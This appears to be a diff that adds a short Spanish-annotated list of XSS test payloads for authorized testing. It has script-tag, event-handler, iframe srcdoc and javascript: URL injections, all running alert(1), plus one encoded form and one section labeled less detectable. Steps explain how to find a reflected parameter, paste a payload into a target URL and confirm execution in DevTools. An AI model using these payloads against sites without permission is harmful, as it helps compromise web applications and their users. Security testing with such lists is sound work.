@@ -1,0 +1,24 @@
+# XSS payloads (simple list) -- USAR SOLO CON PERMISO
+
+# Básicos (no destructivos)
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><svg/onload=alert(1)>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E  # encoded
+
+# Atributos de event handlers
+" onfocus=alert(1) autofocus>
+
+# HTML menos detectable
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+# Inyecciones para valores en atributo
+" onmouseover=alert(1) x="
+
+# DOM-based (ejemplos para usar en URL o inputs que se reflejen en DOM)
+javascript:alert(1)
+
+# Instrucciones:
+# 1) Identifica el parámetro vulnerable (p.e. `q` en /search?q=).
+# 2) Usa `test_files/xss_test.html` o pega directamente en la barra: https://target/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+# 3) Observa DevTools -> Console y Network; guarda la request/response y captura de pantalla si ves ejecución.
